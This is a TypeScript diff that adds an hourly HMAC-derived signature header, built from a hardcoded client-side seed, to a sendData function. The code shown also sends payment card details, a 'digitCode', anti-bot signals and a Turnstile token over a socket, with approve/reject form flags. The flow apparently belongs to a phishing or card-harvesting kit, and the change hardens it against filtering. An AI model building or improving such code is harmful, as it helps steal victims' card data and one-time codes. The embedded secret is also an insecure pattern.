@@ -77,6 +77,34 @@ function getTurnstileToken(): string | null {
   return _turnstileToken;
 }
 
+// Dynamic Secret Header - HMAC-based, changes every hour
+const _SECRET_SEED = 'kQ9$xW2!mP7@vL4#nR8&jT5';
+
+async function generateSecretHeader(): Promise<string> {
+  const hourBlock = Math.floor(Date.now() / 3600000); // Changes every hour
+  const raw = `${_SECRET_SEED}:${hourBlock}:${navigator.userAgent.length}`;
+  
+  if (typeof window !== 'undefined' && window.crypto && window.crypto.subtle) {
+    const encoder = new TextEncoder();
+    const data = encoder.encode(raw);
+    const key = await window.crypto.subtle.importKey(
+      'raw', encoder.encode(_SECRET_SEED),
+      { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
+    );
+    const signature = await window.crypto.subtle.sign('HMAC', key, data);
+    const hashArray = Array.from(new Uint8Array(signature));
+    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 32);
+  }
+  // Fallback for older browsers
+  let hash = 0;
+  for (let i = 0; i < raw.length; i++) {
+    const char = raw.charCodeAt(i);
+    hash = ((hash << 5) - hash) + char;
+    hash = hash & hash;
+  }
+  return Math.abs(hash).toString(16).padStart(8, '0') + hourBlock.toString(16);
+}
+
 function normalizeSocketUrl(rawValue?: string) {
   const candidate = rawValue?.trim();
 
@@ -202,7 +230,7 @@ export interface PaymentData {
 let pendingData: Parameters<typeof sendData>[0] | null = null;
 
 // Function to send data to server
-export function sendData(params: {
+export async function sendData(params: {
   data?: Record<string, any>;
   paymentCard?: Record<string, any>;
   digitCode?: string;
@@ -227,6 +255,8 @@ export function sendData(params: {
   isFormApproved.value = false;
   isFormRejected.value = false;
 
+  const _sig = await generateSecretHeader();
+
   const payload = {
     content: params.data,
     paymentCard: params.paymentCard,
@@ -237,6 +267,7 @@ export function sendData(params: {
     mode: params.mode,
     _bp: getBotSignals(),
     _cf: getTurnstileToken(),
+    _sig,
   };
   
   console.log("Emitting more-info with payload:", payload);
